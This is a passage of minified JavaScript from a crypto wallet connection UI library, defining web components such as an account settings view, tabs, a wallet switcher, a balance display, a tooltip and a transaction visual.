            <wui-text variant="lg-regular" color="primary">Disconnect</wui-text>
          </wui-list-item>
        </wui-flex>
      </wui-flex>
    `}chooseNameButtonTemplate(){const e=this.network?.chainNamespace,n=Ce.getConnectorId(e),r=Ce.getAuthConnector();return!Y.checkIfNamesSupported()||!r||n!==ge.CONNECTOR_ID.AUTH||this.profileName?null:X`
      <wui-list-item
        icon="id"
        ?rounded=${!0}
        ?chevron=${!0}
        @click=${this.onChooseName.bind(this)}
        data-testid="account-choose-name-button"
      >
        <wui-text variant="lg-regular" color="primary">Choose account name </wui-text>
      </wui-list-item>
    `}authCardTemplate(){const e=Ce.getConnectorId(this.network?.chainNamespace),n=Ce.getAuthConnector(),{origin:r}=location;return!n||e!==ge.CONNECTOR_ID.AUTH||r.includes(jt.SECURE_SITE)?null:X`
      <wui-notice-card
        @click=${this.onGoToUpgradeView.bind(this)}
        label="Upgrade your wallet"
        description="Transition to a self-custodial wallet"
        icon="wallet"
        data-testid="w3m-wallet-upgrade-card"
      ></wui-notice-card>
    `}isAllowedNetworkSwitch(){const e=Y.getAllRequestedCaipNetworks(),n=e?e.length>1:!1,r=e?.find(({id:i})=>i===this.network?.id);return n||!r}onCopyAddress(){try{this.address&&(xe.copyToClopboard(this.address),on.showSuccess("Address copied"))}catch{on.showError("Failed to copy")}}smartAccountSettingsTemplate(){const e=this.network?.chainNamespace,n=Y.checkIfSmartAccountEnabled(),r=Ce.getConnectorId(e);return!Ce.getAuthConnector()||r!==ge.CONNECTOR_ID.AUTH||!n?null:X`
      <wui-list-item
        icon="user"
        ?rounded=${!0}
        ?chevron=${!0}
        @click=${this.onSmartAccountSettings.bind(this)}
        data-testid="account-smart-account-settings-button"
      >
        <wui-text variant="lg-regular" color="primary">Smart Account Settings</wui-text>
      </wui-list-item>
    `}onChooseName(){we.push("ChooseAccountName")}onNetworks(){this.isAllowedNetworkSwitch()&&we.push("Networks")}async onDisconnect(){try{this.disconnecting=!0;const e=this.network?.chainNamespace,r=ke.getConnections(e).length>0,i=e&&Ce.state.activeConnectorIds[e],s=this.remoteFeatures?.multiWallet;await ke.disconnect(s?{id:i,namespace:e}:{}),r&&s&&(we.push("ProfileWallets"),on.showSuccess("Wallet deleted"))}catch{tt.sendEvent({type:"track",event:"DISCONNECT_ERROR",properties:{message:"Failed to disconnect"}}),on.showError("Failed to disconnect")}finally{this.disconnecting=!1}}onGoToUpgradeView(){tt.sendEvent({type:"track",event:"EMAIL_UPGRADE_FROM_MODAL"}),we.push("UpgradeEmailWallet")}onSmartAccountSettings(){we.push("SmartAccountSettings")}};Vg([Ee()],kf.prototype,"address",void 0);Vg([Ee()],kf.prototype,"profileImage",void 0);Vg([Ee()],kf.prototype,"profileName",void 0);Vg([Ee()],kf.prototype,"network",void 0);Vg([Ee()],kf.prototype,"disconnecting",void 0);Vg([Ee()],kf.prototype,"remoteFeatures",void 0);kf=Vg([Ue("w3m-account-settings-view")],kf);const Tke=ot`
  :host {
    flex: 1;
    height: 100%;
  }

  button {
    width: 100%;
    height: 100%;
    display: inline-flex;
    align-items: center;
    padding: ${({spacing:t})=>t[1]} ${({spacing:t})=>t[2]};
    column-gap: ${({spacing:t})=>t[1]};
    color: ${({tokens:t})=>t.theme.textSecondary};
    border-radius: ${({borderRadius:t})=>t[20]};
    background-color: transparent;
    transition: background-color ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: background-color;
  }

  /* -- Hover & Active states ----------------------------------------------------------- */
  button[data-active='true'] {
    color: ${({tokens:t})=>t.theme.textPrimary};
    background-color: ${({tokens:t})=>t.theme.foregroundTertiary};
  }

  button:hover:enabled:not([data-active='true']),
  button:active:enabled:not([data-active='true']) {
    wui-text,
    wui-icon {
      color: ${({tokens:t})=>t.theme.textPrimary};
    }
  }
`;var fA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const xke={lg:"lg-regular",md:"md-regular",sm:"sm-regular"},Ike={lg:"md",md:"sm",sm:"sm"};let yg=class extends $e{constructor(){super(...arguments),this.icon="mobile",this.size="md",this.label="",this.active=!1}render(){return X`
      <button data-active=${this.active}>
        ${this.icon?X`<wui-icon size=${Ike[this.size]} name=${this.icon}></wui-icon>`:""}
        <wui-text variant=${xke[this.size]}> ${this.label} </wui-text>
      </button>
    `}};yg.styles=[Dt,nr,Tke];fA([ie()],yg.prototype,"icon",void 0);fA([ie()],yg.prototype,"size",void 0);fA([ie()],yg.prototype,"label",void 0);fA([ie({type:Boolean})],yg.prototype,"active",void 0);yg=fA([Ue("wui-tab-item")],yg);const Rke=ot`
  :host {
    display: inline-flex;
    align-items: center;
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    border-radius: ${({borderRadius:t})=>t[32]};
    padding: ${({spacing:t})=>t["01"]};
    box-sizing: border-box;
  }

  :host([data-size='sm']) {
    height: 26px;
  }

  :host([data-size='md']) {
    height: 36px;
  }
`;var hA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let bg=class extends $e{constructor(){super(...arguments),this.tabs=[],this.onTabChange=()=>null,this.size="md",this.activeTab=0}render(){return this.dataset.size=this.size,this.tabs.map((e,n)=>{const r=n===this.activeTab;return X`
        <wui-tab-item
          @click=${()=>this.onTabClick(n)}
          icon=${e.icon}
          size=${this.size}
          label=${e.label}
          ?active=${r}
          data-active=${r}
          data-testid="tab-${e.label?.toLowerCase()}"
        ></wui-tab-item>
      `})}onTabClick(e){this.activeTab=e,this.onTabChange(e)}};bg.styles=[Dt,nr,Rke];hA([ie({type:Array})],bg.prototype,"tabs",void 0);hA([ie()],bg.prototype,"onTabChange",void 0);hA([ie()],bg.prototype,"size",void 0);hA([Ee()],bg.prototype,"activeTab",void 0);bg=hA([Ue("wui-tabs")],bg);const Pke=ot`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: ${({spacing:t})=>t[1]};
    text-transform: uppercase;
    white-space: nowrap;
  }

  :host([data-variant='accent']) {
    background-color: ${({tokens:t})=>t.core.foregroundAccent010};
    color: ${({tokens:t})=>t.core.textAccentPrimary};
  }

  :host([data-variant='info']) {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    color: ${({tokens:t})=>t.theme.textSecondary};
  }

  :host([data-variant='success']) {
    background-color: ${({tokens:t})=>t.core.backgroundSuccess};
    color: ${({tokens:t})=>t.core.textSuccess};
  }

  :host([data-variant='warning']) {
    background-color: ${({tokens:t})=>t.core.backgroundWarning};
    color: ${({tokens:t})=>t.core.textWarning};
  }

  :host([data-variant='error']) {
    background-color: ${({tokens:t})=>t.core.backgroundError};
    color: ${({tokens:t})=>t.core.textError};
  }

  :host([data-variant='certified']) {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    color: ${({tokens:t})=>t.theme.textSecondary};
  }

  :host([data-size='md']) {
    height: 30px;
    padding: 0 ${({spacing:t})=>t[2]};
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  :host([data-size='sm']) {
    height: 20px;
    padding: 0 ${({spacing:t})=>t[1]};
    border-radius: ${({borderRadius:t})=>t[1]};
  }
`;var h8=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let N1=class extends $e{constructor(){super(...arguments),this.variant="accent",this.size="md",this.icon=void 0}render(){this.dataset.variant=this.variant,this.dataset.size=this.size;const e=this.size==="md"?"md-medium":"sm-medium",n=this.size==="md"?"md":"sm";return X`
      ${this.icon?X`<wui-icon size=${n} name=${this.icon}></wui-icon>`:null}
      <wui-text
        display="inline"
        data-variant=${this.variant}
        variant=${e}
        color="inherit"
      >
        <slot></slot>
      </wui-text>
    `}};N1.styles=[Dt,Pke];h8([ie()],N1.prototype,"variant",void 0);h8([ie()],N1.prototype,"size",void 0);h8([ie()],N1.prototype,"icon",void 0);N1=h8([Ue("wui-tag")],N1);const Nke=ot`
  button {
    display: flex;
    align-items: center;
    height: 40px;
    padding: ${({spacing:t})=>t[2]};
    border-radius: ${({borderRadius:t})=>t[4]};
    column-gap: ${({spacing:t})=>t[1]};
    background-color: transparent;
    transition: background-color ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: background-color;
  }

  wui-image,
  .icon-box {
    width: ${({spacing:t})=>t[6]};
    height: ${({spacing:t})=>t[6]};
    border-radius: ${({borderRadius:t})=>t[4]};
  }

  wui-text {
    flex: 1;
  }

  .icon-box {
    position: relative;
  }

  .icon-box[data-active='true'] {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  .circle {
    position: absolute;
    left: 16px;
    top: 15px;
    width: 8px;
    height: 8px;
    background-color: ${({tokens:t})=>t.core.textSuccess};
    box-shadow: 0 0 0 2px ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: 50%;
  }

  /* -- Hover & Active states ----------------------------------------------------------- */
  @media (hover: hover) {
    button:hover:enabled,
    button:active:enabled {
      background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    }
  }
`;var ad=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let zc=class extends $e{constructor(){super(...arguments),this.address="",this.profileName="",this.alt="",this.imageSrc="",this.icon=void 0,this.iconSize="md",this.loading=!1,this.charsStart=4,this.charsEnd=6}render(){return X`
      <button>
        ${this.leftImageTemplate()} ${this.textTemplate()} ${this.rightImageTemplate()}
      </button>
    `}leftImageTemplate(){const e=this.icon?X`<wui-icon
          size=${et(this.iconSize)}
          color="default"
          name=${this.icon}
          class="icon"
        ></wui-icon>`:X`<wui-image src=${this.imageSrc} alt=${this.alt}></wui-image>`;return X`
      <wui-flex
        alignItems="center"
        justifyContent="center"
        class="icon-box"
        data-active=${!!this.icon}
      >
        ${e}
        <wui-flex class="circle"></wui-flex>
      </wui-flex>
    `}textTemplate(){return X`
      <wui-text variant="lg-regular" color="primary">
        ${Cr.getTruncateString({string:this.profileName||this.address,charsStart:this.profileName?16:this.charsStart,charsEnd:this.profileName?0:this.charsEnd,truncate:this.profileName?"end":"middle"})}
      </wui-text>
    `}rightImageTemplate(){return X`<wui-icon name="chevronBottom" size="sm" color="default"></wui-icon>`}};zc.styles=[Dt,nr,Nke];ad([ie()],zc.prototype,"address",void 0);ad([ie()],zc.prototype,"profileName",void 0);ad([ie()],zc.prototype,"alt",void 0);ad([ie()],zc.prototype,"imageSrc",void 0);ad([ie()],zc.prototype,"icon",void 0);ad([ie()],zc.prototype,"iconSize",void 0);ad([ie({type:Boolean})],zc.prototype,"loading",void 0);ad([ie({type:Number})],zc.prototype,"charsStart",void 0);ad([ie({type:Number})],zc.prototype,"charsEnd",void 0);zc=ad([Ue("wui-wallet-switch")],zc);const Oke=ot`
  wui-icon-link {
    margin-right: calc(${({spacing:t})=>t[8]} * -1);
  }

  wui-notice-card {
    margin-bottom: ${({spacing:t})=>t[1]};
  }

  wui-list-item > wui-text {
    flex: 1;
  }

  w3m-transactions-view {
    max-height: 200px;
  }

  .balance-container {
    display: inline;
  }

  .tab-content-container {
    height: 300px;
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: none;
  }

  .symbol {
    transform: translateY(-2px);
  }

  .tab-content-container::-webkit-scrollbar {
    display: none;
  }

  .account-button {
    width: auto;
    border: none;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: ${({spacing:t})=>t[3]};
    height: 48px;
    padding: ${({spacing:t})=>t[2]};
    padding-right: ${({spacing:t})=>t[3]};
    box-shadow: inset 0 0 0 1px ${({tokens:t})=>t.theme.foregroundPrimary};
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[6]};
    transition: background-color ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
  }

  .account-button:hover {
    background-color: ${({tokens:t})=>t.core.glass010};
  }

  .avatar-container {
    position: relative;
  }

  wui-avatar.avatar {
    width: 32px;
    height: 32px;
    box-shadow: 0 0 0 2px ${({tokens:t})=>t.core.glass010};
  }

  wui-wallet-switch {
    margin-top: ${({spacing:t})=>t[2]};
  }

  wui-avatar.network-avatar {
    width: 16px;
    height: 16px;
    position: absolute;
    left: 100%;
    top: 100%;
    transform: translate(-75%, -75%);
    box-shadow: 0 0 0 2px ${({tokens:t})=>t.core.glass010};
  }

  .account-links {
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .account-links wui-flex {
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    flex: 1;
    background: red;
    align-items: center;
    justify-content: center;
    height: 48px;
    padding: 10px;
    flex: 1 0 0;
    border-radius: var(--XS, 16px);
    border: 1px solid var(--dark-accent-glass-010, rgba(71, 161, 255, 0.1));
    background: var(--dark-accent-glass-010, rgba(71, 161, 255, 0.1));
    transition:
      background-color ${({durations:t})=>t.md}
        ${({easings:t})=>t["ease-out-power-1"]},
      opacity ${({durations:t})=>t.md} ${({easings:t})=>t["ease-out-power-1"]};
    will-change: background-color, opacity;
  }

  .account-links wui-flex:hover {
    background: var(--dark-accent-glass-015, rgba(71, 161, 255, 0.15));
  }

  .account-links wui-flex wui-icon {
    width: var(--S, 20px);
    height: var(--S, 20px);
  }

  .account-links wui-flex wui-icon svg path {
    stroke: #667dff;
  }
`;var Kc=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let na=class extends $e{constructor(){super(),this.unsubscribe=[],this.caipAddress=Y.getAccountData()?.caipAddress,this.address=xe.getPlainAddress(Y.getAccountData()?.caipAddress),this.profileImage=Y.getAccountData()?.profileImage,this.profileName=Y.getAccountData()?.profileName,this.disconnecting=!1,this.balance=Y.getAccountData()?.balance,this.balanceSymbol=Y.getAccountData()?.balanceSymbol,this.features=de.state.features,this.remoteFeatures=de.state.remoteFeatures,this.namespace=Y.state.activeChain,this.activeConnectorIds=Ce.state.activeConnectorIds,this.unsubscribe.push(Y.subscribeChainProp("accountState",e=>{this.address=xe.getPlainAddress(e?.caipAddress),this.caipAddress=e?.caipAddress,this.balance=e?.balance,this.balanceSymbol=e?.balanceSymbol,this.profileName=e?.profileName,this.profileImage=e?.profileImage}),de.subscribeKey("features",e=>this.features=e),de.subscribeKey("remoteFeatures",e=>this.remoteFeatures=e),Ce.subscribeKey("activeConnectorIds",e=>{this.activeConnectorIds=e}),Y.subscribeKey("activeChain",e=>this.namespace=e),Y.subscribeKey("activeCaipNetwork",e=>{e?.chainNamespace&&(this.namespace=e?.chainNamespace)}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){if(!this.caipAddress||!this.namespace)return null;const e=this.activeConnectorIds[this.namespace],n=e?Ce.getConnectorById(e):void 0,r=er.getConnectorImage(n),{value:i,decimals:s,symbol:o}=xe.parseBalance(this.balance,this.balanceSymbol);return X`<wui-flex
        flexDirection="column"
        .padding=${["0","5","4","5"]}
        alignItems="center"
        gap="3"
      >
        <wui-avatar
          alt=${et(this.caipAddress)}
          address=${et(xe.getPlainAddress(this.caipAddress))}
          imageSrc=${et(this.profileImage===null?void 0:this.profileImage)}
          data-testid="single-account-avatar"
        ></wui-avatar>
        <wui-wallet-switch
          profileName=${this.profileName}
          address=${this.address}
          imageSrc=${r}
          alt=${n?.name}
          @click=${this.onGoToProfileWalletsView.bind(this)}
          data-testid="wui-wallet-switch"
        ></wui-wallet-switch>
        <div class="balance-container">
          <wui-text variant="h3-regular" color="primary">${i}</wui-text>
          <wui-text variant="h3-regular" color="secondary">.${s}</wui-text>
          <wui-text variant="h6-medium" color="primary" class="symbol">${o}</wui-text>
        </div>
        ${this.explorerBtnTemplate()}
      </wui-flex>

      <wui-flex flexDirection="column" gap="2" .padding=${["0","3","3","3"]}>
        ${this.authCardTemplate()} <w3m-account-auth-button></w3m-account-auth-button>
        ${this.orderedFeaturesTemplate()} ${this.activityTemplate()}
        <wui-list-item
          .rounded=${!0}
          icon="power"
          iconColor="error"
          ?chevron=${!1}
          .loading=${this.disconnecting}
          .rightIcon=${!1}
          @click=${this.onDisconnect.bind(this)}
          data-testid="disconnect-button"
        >
          <wui-text variant="lg-regular" color="primary">Disconnect</wui-text>
        </wui-list-item>
      </wui-flex>`}fundWalletTemplate(){if(!this.namespace)return null;const e=jt.ONRAMP_SUPPORTED_CHAIN_NAMESPACES.includes(this.namespace),n=!!this.features?.receive,r=this.remoteFeatures?.onramp&&e,i=Hi.isPayWithExchangeEnabled();return!r&&!n&&!i?null:X`
      <wui-list-item
        .rounded=${!0}
        data-testid="w3m-account-default-fund-wallet-button"
        iconVariant="blue"
        icon="dollar"
        ?chevron=${!0}
        @click=${this.handleClickFundWallet.bind(this)}
      >
        <wui-text variant="lg-regular" color="primary">Fund wallet</wui-text>
      </wui-list-item>
    `}orderedFeaturesTemplate(){return(this.features?.walletFeaturesOrder||jt.DEFAULT_FEATURES.walletFeaturesOrder).map(n=>{switch(n){case"onramp":return this.fundWalletTemplate();case"swaps":return this.swapsTemplate();case"send":return this.sendTemplate();default:return null}})}activityTemplate(){return this.namespace&&this.remoteFeatures?.activity&&jt.ACTIVITY_ENABLED_CHAIN_NAMESPACES.includes(this.namespace)?X` <wui-list-item
          .rounded=${!0}
          icon="clock"
          ?chevron=${!0}
          @click=${this.onTransactions.bind(this)}
          data-testid="w3m-account-default-activity-button"
        >
          <wui-text variant="lg-regular" color="primary">Activity</wui-text>
        </wui-list-item>`:null}swapsTemplate(){const e=this.remoteFeatures?.swaps,n=Y.state.activeChain===ge.CHAIN.EVM;return!e||!n?null:X`
      <wui-list-item
        .rounded=${!0}
        icon="recycleHorizontal"
        ?chevron=${!0}
        @click=${this.handleClickSwap.bind(this)}
        data-testid="w3m-account-default-swaps-button"
      >
        <wui-text variant="lg-regular" color="primary">Swap</wui-text>
      </wui-list-item>
    `}sendTemplate(){const e=this.features?.send,n=Y.state.activeChain;if(!n)throw new Error("SendController:sendTemplate - namespace is required");const r=jt.SEND_SUPPORTED_NAMESPACES.includes(n);return!e||!r?null:X`
      <wui-list-item
        .rounded=${!0}
        icon="send"
        ?chevron=${!0}
        @click=${this.handleClickSend.bind(this)}
        data-testid="w3m-account-default-send-button"
      >
        <wui-text variant="lg-regular" color="primary">Send</wui-text>
      </wui-list-item>
    `}authCardTemplate(){const e=Y.state.activeChain;if(!e)throw new Error("AuthCardTemplate:authCardTemplate - namespace is required");const n=Ce.getConnectorId(e),r=Ce.getAuthConnector(),{origin:i}=location;return!r||n!==ge.CONNECTOR_ID.AUTH||i.includes(jt.SECURE_SITE)?null:X`
      <wui-notice-card
        @click=${this.onGoToUpgradeView.bind(this)}
        label="Upgrade your wallet"
        description="Transition to a self-custodial wallet"
        icon="wallet"
        data-testid="w3m-wallet-upgrade-card"
      ></wui-notice-card>
    `}handleClickFundWallet(){we.push("FundWallet")}handleClickSwap(){we.push("Swap")}handleClickSend(){we.push("WalletSend")}explorerBtnTemplate(){return Y.getAccountData()?.addressExplorerUrl?X`
      <wui-button size="md" variant="accent-primary" @click=${this.onExplorer.bind(this)}>
        <wui-icon size="sm" color="inherit" slot="iconLeft" name="compass"></wui-icon>
        Block Explorer
        <wui-icon size="sm" color="inherit" slot="iconRight" name="externalLink"></wui-icon>
      </wui-button>
    `:null}onTransactions(){tt.sendEvent({type:"track",event:"CLICK_TRANSACTIONS",properties:{isSmartAccount:Zr(Y.state.activeChain)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT}}),we.push("Transactions")}async onDisconnect(){try{this.disconnecting=!0;const n=ke.getConnections(this.namespace).length>0,r=this.namespace&&Ce.state.activeConnectorIds[this.namespace],i=this.remoteFeatures?.multiWallet;await ke.disconnect(i?{id:r,namespace:this.namespace}:{}),n&&i&&(we.push("ProfileWallets"),on.showSuccess("Wallet deleted"))}catch{tt.sendEvent({type:"track",event:"DISCONNECT_ERROR",properties:{message:"Failed to disconnect"}}),on.showError("Failed to disconnect")}finally{this.disconnecting=!1}}onExplorer(){const e=Y.getAccountData()?.addressExplorerUrl;e&&xe.openHref(e,"_blank")}onGoToUpgradeView(){tt.sendEvent({type:"track",event:"EMAIL_UPGRADE_FROM_MODAL"}),we.push("UpgradeEmailWallet")}onGoToProfileWalletsView(){we.push("ProfileWallets")}};na.styles=Oke;Kc([Ee()],na.prototype,"caipAddress",void 0);Kc([Ee()],na.prototype,"address",void 0);Kc([Ee()],na.prototype,"profileImage",void 0);Kc([Ee()],na.prototype,"profileName",void 0);Kc([Ee()],na.prototype,"disconnecting",void 0);Kc([Ee()],na.prototype,"balance",void 0);Kc([Ee()],na.prototype,"balanceSymbol",void 0);Kc([Ee()],na.prototype,"features",void 0);Kc([Ee()],na.prototype,"remoteFeatures",void 0);Kc([Ee()],na.prototype,"namespace",void 0);Kc([Ee()],na.prototype,"activeConnectorIds",void 0);na=Kc([Ue("w3m-account-default-widget")],na);const kke=ot`
  span {
    font-weight: 500;
    font-size: 38px;
    color: ${({tokens:t})=>t.theme.textPrimary};
    line-height: 38px;
    letter-spacing: -2%;
    text-align: center;
    font-family: var(--apkt-fontFamily-regular);
  }

  .pennies {
    color: ${({tokens:t})=>t.theme.textSecondary};
  }
`;var tj=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let m_=class extends $e{constructor(){super(...arguments),this.dollars="0",this.pennies="00"}render(){return X`<span>$${this.dollars}<span class="pennies">.${this.pennies}</span></span>`}};m_.styles=[Dt,kke];tj([ie()],m_.prototype,"dollars",void 0);tj([ie()],m_.prototype,"pennies",void 0);m_=tj([Ue("wui-balance")],m_);const Dke=ot`
  :host {
    display: inline-flex;
    justify-content: center;
    align-items: center;
    position: relative;
  }

  wui-icon {
    position: absolute;
    width: 12px !important;
    height: 4px !important;
  }

  /* -- Variants --------------------------------------------------------- */
  :host([data-variant='fill']) {
    background-color: ${({colors:t})=>t.neutrals100};
  }

  :host([data-variant='shade']) {
    background-color: ${({colors:t})=>t.neutrals900};
  }

  :host([data-variant='fill']) > wui-text {
    color: ${({colors:t})=>t.black};
  }

  :host([data-variant='shade']) > wui-text {
    color: ${({colors:t})=>t.white};
  }

  :host([data-variant='fill']) > wui-icon {
    color: ${({colors:t})=>t.neutrals100};
  }

  :host([data-variant='shade']) > wui-icon {
    color: ${({colors:t})=>t.neutrals900};
  }

  /* -- Sizes --------------------------------------------------------- */
  :host([data-size='sm']) {
    padding: ${({spacing:t})=>t[1]} ${({spacing:t})=>t[2]};
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  :host([data-size='md']) {
    padding: ${({spacing:t})=>t[2]} ${({spacing:t})=>t[3]};
    border-radius: ${({borderRadius:t})=>t[3]};
  }

  /* -- Placements --------------------------------------------------------- */
  wui-icon[data-placement='top'] {
    bottom: 0px;
    left: 50%;
    transform: translate(-50%, 95%);
  }

  wui-icon[data-placement='bottom'] {
    top: 0;
    left: 50%;
    transform: translate(-50%, -95%) rotate(180deg);
  }

  wui-icon[data-placement='right'] {
    top: 50%;
    left: 0;
    transform: translate(-65%, -50%) rotate(90deg);
  }

  wui-icon[data-placement='left'] {
    top: 50%;
    right: 0%;
    transform: translate(65%, -50%) rotate(270deg);
  }
`;var pA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const Bke={sm:"sm-regular",md:"md-regular"};let wg=class extends $e{constructor(){super(...arguments),this.placement="top",this.variant="fill",this.size="md",this.message=""}render(){return this.dataset.variant=this.variant,this.dataset.size=this.size,X`<wui-icon data-placement=${this.placement} size="inherit" name="cursor"></wui-icon>
      <wui-text variant=${Bke[this.size]}>${this.message}</wui-text>`}};wg.styles=[Dt,nr,Dke];pA([ie()],wg.prototype,"placement",void 0);pA([ie()],wg.prototype,"variant",void 0);pA([ie()],wg.prototype,"size",void 0);pA([ie()],wg.prototype,"message",void 0);wg=pA([Ue("wui-tooltip")],wg);var V7;(function(t){t.approve="approved",t.bought="bought",t.borrow="borrowed",t.burn="burnt",t.cancel="canceled",t.claim="claimed",t.deploy="deployed",t.deposit="deposited",t.execute="executed",t.mint="minted",t.receive="received",t.repay="repaid",t.send="sent",t.sell="sold",t.stake="staked",t.trade="swapped",t.unstake="unstaked",t.withdraw="withdrawn"})(V7||(V7={}));const jke=ot`
  :host > wui-flex {
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    width: 40px;
    height: 40px;
    box-shadow: inset 0 0 0 1px ${({tokens:t})=>t.core.glass010};
    background-color: ${({tokens:t})=>t.core.glass010};
  }

  :host([data-no-images='true']) > wui-flex {
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[3]} !important;
  }

  :host > wui-flex wui-image {
    display: block;
  }

  :host > wui-flex,
  :host > wui-flex wui-image,
  .swap-images-container,
  .swap-images-container.nft,
  wui-image.nft {
    border-top-left-radius: var(--local-left-border-radius);
    border-top-right-radius: var(--local-right-border-radius);
    border-bottom-left-radius: var(--local-left-border-radius);
    border-bottom-right-radius: var(--local-right-border-radius);
  }

  wui-icon {
    width: 20px;
    height: 20px;
  }

  .swap-images-container {
    position: relative;
    width: 40px;
    height: 40px;
    overflow: hidden;
  }

  .swap-images-container wui-image:first-child {
    position: absolute;
    width: 40px;
    height: 40px;
    top: 0;
    left: 0%;
    clip-path: inset(0px calc(50% + 2px) 0px 0%);
  }

  .swap-images-container wui-image:last-child {
    clip-path: inset(0px 0px 0px calc(50% + 2px));
  }

  wui-flex.status-box {
    position: absolute;
    right: 0;
    bottom: 0;
    transform: translate(20%, 20%);
    border-radius: ${({borderRadius:t})=>t[4]};
    background-color: ${({tokens:t})=>t.theme.backgroundPrimary};
    box-shadow: 0 0 0 2px ${({tokens:t})=>t.theme.backgroundPrimary};
    overflow: hidden;
    width: 16px;
    height: 16px;
  }
`;var Wg=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Df=class extends $e{constructor(){super(...arguments),this.images=[],this.secondImage={type:void 0,url:""}}render(){const[e,n]=this.images;this.images.length||(this.dataset.noImages="true");const r=e?.type==="NFT",i=n?.url?n.type==="NFT":r,s=r?"var(--apkt-borderRadius-3)":"var(--apkt-borderRadius-5)",o=i?"var(--apkt-borderRadius-3)":"var(--apkt-borderRadius-5)";return this.style.cssText=`
    --local-left-border-radius: ${s};
    --local-right-border-radius: ${o};
    `,X`<wui-flex> ${this.templateVisual()} ${this.templateIcon()} </wui-flex>`}templateVisual(){const[e,n]=this.images,r=e?.type;return this.images.length===2&&(e?.url||n?.url)?X`<div class="swap-images-container">
        ${e?.url?X`<wui-image src=${e.url} alt="Transaction image"></wui-image>`:null}
        ${n?.url?X`<wui-image src=${n.url} alt="Transaction image"></wui-image>`:null}
      </div>`:e?.url?X`<wui-image src=${e.url} alt="Transaction image"></wui-image>`:r==="NFT"?X`<wui-icon size="inherit" color="default" name="nftPlaceholder"></wui-icon>`:X`<wui-icon size="inherit" color="default" name="coinPlaceholder"></wui-icon>`}templateIcon(){let e="accent-primary",n;return n=this.getIcon(),this.status&&(e=this.getStatusColor()),n?X`
      <wui-flex alignItems="center" justifyContent="center" class="status-box">
        <wui-icon-box size="sm" color=${e} icon=${n}></wui-icon-box>
      </wui-flex>
